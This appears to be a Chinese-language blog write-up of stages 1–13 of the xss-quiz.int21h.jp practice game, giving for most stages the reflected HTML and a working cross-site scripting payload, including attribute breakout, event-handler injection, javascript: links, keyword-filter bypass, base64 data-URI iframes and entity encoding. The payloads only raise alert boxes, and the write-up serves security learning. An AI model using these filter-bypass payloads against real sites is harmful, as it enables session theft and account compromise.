---
title: XSS Game -2
date: 2018-02-07 13:20:46
tags:
		- XSS
categories:
		- Web安全

---

[XSS 学习小游戏](http://xss-quiz.int21h.jp/)

<!-- more -->



##### Stage #1

`Search`搜索框

输入 `11111`，输出的是 `11111`

	<b>"11111"</b>

`payload`

	</b><script>alert(document.domain);</script>

输出结果

	<b>"</b>
	<script>alert(document.domain);</script>


直接输入也行 `<script>alert(document.domain);</script>`。`<script>`可以直接在`<b>`标签中执行。

	<b>"<script>alert(document.domain);</script>"</b>


##### Stage #2

输出的内容

	<input type="text" name="p1" size="50" value="abcefd">

`payload`

	"><script>alert(document.domain);</script>

输出

	<input type="text" name="p1" size="50" value="">
	<script>alert(document.domain);</script>
	"&gt;

##### Stage #3

提示

	The input in text box is properly escaped

参数`p1`命中的`< >` 特殊字符被转义。

	 <b>"&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;"</b> 

如何绕过转义呢？

	字符    替换后
	& (& 符号)    &amp;
	" (双引号)    &quot;，除非设置了 ENT_NOQUOTES
	' (单引号)    设置了 ENT_QUOTES 后， &#039; (如果是 ENT_HTML401) ，或者 &apos; (如果是 ENT_XML1、 ENT_XHTML 或 ENT_HTML5)。
	< (小于)    &lt;
	> (大于)    &gt;

`javascript`在`<b>`标签里面不能执行成功

	<b>"onmouseover=confirm(1)"</b> 

但是在`<input>`倒是可以。

	<input name=test value='' onmouseover=confirm(1)>


在`p2`参数里面。输入`payload`。

抓包修改参数`p2`

	p1=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&p2="><script>alert(document.domain);</script>

输出内容

	<b>"><script>alert(document.domain);</script></b>


##### Stage #4

输入

	<>&

输出内容

	&lt;&gt;&amp;&quot;

和第三关一样，`p1`和`p2`参数都被过滤了，有一个隐藏的表单`p3`没有被过滤。在`p3`中输入`payload`。

	&lt;&gt;&amp;&quot;

	"><script>alert(document.domain);</script>


##### Stage #5

长度限制

	length limited text box

	<input type="text" name="p1" maxlength="15" size="30" value="111111111111111">

只允许输入15个字符。如何绕过。

只是在前端进行设置的，修改其中的`maxlength`为50。

	"><script>alert(document.domain);</script>

##### Stage #6

	 event handler attribute   事件处理属性

输入的内容又是被转义了。

	<input type="text" name="p1" size="50" value="&lt;&gt;""&amp;">

使用事件型标签。

	123" onmouseover="alert(document.domain);

输出内容

	<input type="text" name="p1" size="50" value="123" onmouseover="alert(document.domain);">

##### Stage #7

	early the same... but a bit more tricky

同样是被转义了。

	<input type="text" name="p1" size="50" value=&lt;&gt;&quot;&quot;&amp;>


这一次的双引号和单引号也被转义了。`"`输入`""`

输出

	<input type="text" name="p1" size="50" value=&quot;&quot;> 
	
输出的内容

	<input type="text" name="p1" size="50" value=11111111>

`value`字段没有被引号包裹。

直接输入

	onmouseover=alert(document.domain);

输出的内容为：

	<input type="text" name="p1" size="50" value=onmouseover=alert(document.domain);>

`payload`没有起到作用，加一个参数值。

输出的内容，`payload`可以执行成功。

	<input type="text" name="p1" size="50" value=2 onmouseover=alert(document.domain);>

##### Stage #8

	 the 'javascript' scheme

输出的内容。

	<input type="submit" value="Make a Link"><hr class=red>URL: <a href="11111111">11111111</a><hr class=red></form>

使用`javascript`伪协议。

输入内容

	javascript:alert(document.domain);

输出内容

	 <a href="javascript:alert(document.domain);">javascript:alert(document.domain);</a>

##### Stage #9

	UTF-7 XSS

找支持`utf-7`的浏览器测试。

##### [Stage #10](http://xss-quiz.int21h.jp/stage00010.php?sid=75ce4414d3193f63f21839b148ea69d858505a44)

	s/domain//g; 

考虑的不是完全，只是过滤了一部分。

输入

	"><script>alert(document.domain);</script>

输出的内容

	 <input type="text" name="p1" size="50" value=""><script>alert(document.);</script>"> 

过滤了`domain`

输入

	"><script>alert(document.dodomainmain);</script>

输出

	<input type="text" name="p1" size="50" value=""><script>alert(document.domain);</script>"> 


##### [Stage #11](http://xss-quiz.int21h.jp/stage11th.php?sid=798d6e75dd45a35b0345cbf827d388a82369cf73)

	"s/script/xscript/ig;" and "s/on[a-z]+=/onxxx=/ig;" and "s/style=/stxxx=/ig;"

过滤一些`script`和`on`以及`style`标签，需要考虑一些其他的。很明显可以使用`Base64`编码，是它执行`iframe`标签。

	<iframe src="data:text/html;base64, .... base64 encoded HTML data ....">


输入

	"><script>alert(document.domain);</script>

输出

	<input type="text" name="p1" size="50" value=""><xscript>alert(document.domain);</xscript>">


通过编码绕过。使用`inframe`

`<script>alert(document.domain);</script>`通过`Base64`编码。

	"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg=="></iframe>

输出

	<input type="text" name="p1" size="50" value=""><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg=="></iframe>"> 

使用`javascript`伪协议，超链接以及编码。

	"><a href=java&#115;cr&#105;pt:alert(document.domain)>xss</a>


但是，直接使用`<script>`标签，对其进行`Unicode`不可以成功执行。

	"><&#115;cript>alert(document.domain);</&#115;cript>

##### [Stage #12](http://xss-quiz.int21h.jp/stage_no012.php?sid=33e4da789c7fb0321ac2db6f2c45dc574dfa0b8a)

空格、`<`、`>`、`"`、`'`都给过滤了。

	 "s/[\x00-\x20\<\>\"\']//g;"

输入的内容

	&""<><script>

输出的内容

	<input type=text name=p1 size=50 value=&script> 

明显的把`""<>`直接过滤掉了。

不带这些符号的`payload`。过滤了，使用编码转换试试。

反单引号。`，在FireFox没有测试成功，但是在IE10下面可以。

	``onmouseover=alert(document.domain);


##### [Stage #13](http://xss-quiz.int21h.jp/stage13_0.php?sid=1080fd008a8f2004940080dd0f35b2618c4e3314)

	style attribute

输入

	&""<><script>

输出

	<input type="text" name="p1" size="60" style="&amp;&quot;&quot;&lt;&gt;&lt;script&gt;" value="&amp;&quot;&quot;&lt;&gt;&lt;script&gt;"> 





##### 参考

[XSS Challenges Stage 解题报告](http://blog.csdn.net/emaste_r/article/details/16988167)

[Solutions to the wargame XSS Challenges at xss-quiz.int21h.jp](https://github.com/matachi/MaTachi.github.io/blob/master/src/pages/solutions-to-the-wargame-xss-challenges-at-xss-quiz-int21h-jp.md)

